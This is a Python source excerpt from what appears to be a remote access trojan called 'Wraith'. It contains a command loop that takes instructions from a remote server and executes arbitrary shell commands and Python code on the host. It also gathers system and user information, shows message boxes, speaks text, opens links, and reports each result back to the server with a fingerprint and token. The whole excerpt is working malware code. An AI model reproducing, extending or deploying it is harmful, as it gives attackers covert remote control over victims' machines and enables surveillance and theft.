# Redirect stdout to string buffer for exec-py
if platform.system() == "Linux":
    libc = ctypes.CDLL(None)
    c_stdout = ctypes.c_void_p.in_dll(libc, 'stdout')
elif platform.system() == "Windows":
    if sys.version_info < (3, 5): libc = ctypes.CDLL(ctypes.util.find_library('c'))
    else:
        if hasattr(sys, 'gettotalrefcount'): libc = ctypes.CDLL('ucrtbased')
        else: libc = ctypes.CDLL('api-ms-win-crt-stdio-l1-1-0')
    kernel32 = ctypes.WinDLL('kernel32')
    STD_OUTPUT_HANDLE = -11
    c_stdout = kernel32.GetStdHandle(STD_OUTPUT_HANDLE)

@contextmanager
def stdout_redirector(stream):
    # The original fd stdout points to. Usually 1 on POSIX systems.
    original_stdout_fd = sys.stdout.fileno()

    def _redirect_stdout(to_fd):
        # Flush the C-level buffer stdout
        libc.fflush(None)
        # Flush and close sys.stdout - also closes the file descriptor (fd)
        sys.stdout.close()
        # Make original_stdout_fd point to the same file as to_fd
        os.dup2(to_fd, original_stdout_fd)
        # Create a new sys.stdout that points to the redirected fd
        sys.stdout = TextIOWrapper(os.fdopen(original_stdout_fd, 'wb'))

    # Save a copy of the original stdout fd in saved_stdout_fd
    saved_stdout_fd = os.dup(original_stdout_fd)
    try:
        # Create a temporary file and redirect stdout to it
        tfile = SpooledTemporaryFile(mode='w+b')
        _redirect_stdout(tfile.fileno())
        # Yield to caller, then redirect stdout back to the saved fd
        yield
        _redirect_stdout(saved_stdout_fd)
        # Copy contents of temporary file to the given stream
        tfile.flush()
        tfile.seek(0, SEEK_SET)
        stream.write(tfile.read())
    finally:
        tfile.close()
        os.close(saved_stdout_fd)


        def command_execution_function():
            global command_queue
            # No clue what this is but it's needed for tts support
            if platform.system() == "Windows": pythoncom.CoInitialize()
            # Make sure Tkinter windows are hidden, we only want messageboxes
            Tk().withdraw()
            # Initialise tts system
            ttsengine = pyttsx3.init()
            ttsengine.setProperty("volume",1.0)
            # Define list of all commands for `help`
            commands = [
                ["help","Print all commands or show help about one command.\n Args: [command]\n Format: help [command]"],
                ["exec","Executes commands on the OS.\n Args: <command>\n Format: exec <command>"],
                ["exec-py","Executes python3 code.\n Args: <code>\n Format: exec-py <code>"],
                ["info","Show info about OS and hardware.\n Args: None\n Format: info"],
                ["msgbx","Display tk messagebox to user and get their reply.\n Args: <info/warning/error/yesno> <title> <message>\n Format: msgbx <info/warning/error/yesno> | <title> | <message>"],
                ["say", "Say something using TTS.\n Args: <string to say>\n Format: say <text>"],
                ["webopen", "Open a link in default browser.\n Args: <link>\n Format: webopen <link>"],
                ["playsound", "Play a sound from the internet.\n Args: <sound URL>\n Format: playsound <sound URL>"],
                ["reload", "Reload the config and re-fetch the code from the server. Also, log out and log back in.\n Args: None\n Format: reload"],
                ["restart", "Restart wraith process and reconnect (if the file is in the same location).\n Args: None\n Format: restart"],
                ["die", "Kill wraith process.\n Args: None\n Format: die"],
            ]
            while True:
                if len(command_queue) == 0: continue
                current_command_queue = command_queue.copy()
                for cmd in current_command_queue:
                    orig_cmd = cmd
                    result = "No Return Value"
                    try:
                        if cmd.startswith("help"):
                            if cmd == "help":
                                help_menu = "Wraith v{} command list:\nNOTE: Arguments in [square brackets] are not required.".format(WRAITH_VERSION)
                                for command in commands:
                                    help_menu += "\n"+str(commands.index(command)+1)+") "+command[0]+" - "+command[1]
                                result = help_menu
                            else:
                                cmd = cmd.replace("help ","",1)
                                result = "ERR: This command is unrecognised!"
                                for command in commands:
                                    if command[0] == cmd.strip():
                                        result = "{} - {}".format(command[0],command[1])
                                        break
                        elif cmd.startswith("exec-py "):
                            tmp = BytesIO()
                            with stdout_redirector(tmp): exec(cmd.replace("exec-py ","",1))
                            result = "Code executed successfully! Result:\n{}".format(tmp.getvalue().decode())
                        elif cmd.startswith("exec "):
                            command_result = psutil.Popen(cmd.replace("exec ","",1).split(" "), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
                            result = "Code executed successfully! Result:\n\n"+str(command_result.stdout.read(65536).decode()).strip()
                        elif cmd == "info":
                            current_process = psutil.Process()
                            system_info = {
                            "wraith_version": WRAITH_VERSION,
                            "wraith_fingerprint": FINGERPRINT,
                            "system_name": platform.node(),
                            "os": platform.system(),
                            "os_version": platform.version(),
                            "architecture": platform.architecture(),
                            "system_time": str(datetime.now()),
                            "working_dir": os.getcwd(),
                            "cpu_usage": psutil.cpu_percent(interval=1),
                            "physical_cpu_cores": psutil.cpu_count(logical=False),
                            "total_ram": psutil.virtual_memory().total,
                            "free_ram": psutil.virtual_memory().free,
                            "wraith_host_user": current_process.username(),
                            "wraith_start_time": datetime.fromtimestamp(current_process.create_time()).strftime("%H:%M:%S %Y-%m-%d"),
                            "process_priority": current_process.nice(),
                            }
                            system_info_string = "Wraith Version: v{}\nWraith Fingerprint: {}\nSystem Name: {}\nOS: {}\nOS Version: {}\nArchitecture: {}\nSystem Time: {}\nCPU Usage: {}%\nPhysical CPU Cores: {}\nTotal RAM: {}\nFree RAM: {}\nWraith Host User: {}\nWraith Start Time: {}\nWraith Process Priority: {}".format(str(system_info["wraith_version"]).strip(),str(system_info["wraith_fingerprint"]).strip(),str(system_info["system_name"]).strip(),str(system_info["os"]).strip(),str(system_info["os_version"]).strip(),str(system_info["architecture"]).strip(),str(system_info["system_time"]).strip(),str(system_info["cpu_usage"]).strip(),str(system_info["physical_cpu_cores"]).strip(),str(system_info["total_ram"]).strip(),str(system_info["free_ram"]).strip(),str(system_info["wraith_host_user"]).strip(),str(system_info["wraith_start_time"]).strip(),str(system_info["process_priority"]).strip())
                            result = system_info_string
                        elif cmd.startswith("msgbx "):
                            args = cmd.replace("msgbx ","",1).split(" | ")
                            if len(args) != 3: result = "ERR: 3 arguments are required: <type>, <title> and <message>!"
                            if args[0] == "info": user_reaction = messagebox.showinfo(args[1],args[2])
                            elif args[0] == "warning": user_reaction = messagebox.showwarning(args[1],args[2])
                            elif args[0] == "error": user_reaction = messagebox.showerror(args[1],args[2])
                            elif args[0] == "yesno": user_reaction = messagebox.askquestion(args[1],args[2])
                            else: result = "ERR: Invalid type of messagebox!"
                            result = "Successfully displayed messagebox! User replied with: {}.".format(user_reaction)
                        elif cmd.startswith("say "):
                            ttsengine.say(cmd.replace("say ","",1))
                            ttsengine.runAndWait()
                            result = "Successfully said text!"
                        elif cmd.startswith("webopen "):
                            cmd = cmd.replace("webopen ","",1)
                            if not "//" in cmd: cmd = "http://"+cmd
                            webopen(cmd,new=0,autoraise=True)
                            result = "Successfully opened tab!"
                        elif cmd.startswith("playsound "):
                            playsound.playsound(cmd.replace("playsound ","",1))
                            result = "Successfully played sound!"
                        else: result = "ERR: Command is not recognised or required arguments were not provided!"
                    except Exception as err: result = "ERR: {}".format(err)
                    finally:
                        send("response",{"X-FINGERPRINT":FINGERPRINT,"X-TOKEN":TOKEN,"X-DATA":json.dumps("Executed \"{}\" on [{}]\n{}".format(orig_cmd,FINGERPRINT,result))})
                        try: command_queue.remove(orig_cmd)
                        except ValueError: pass
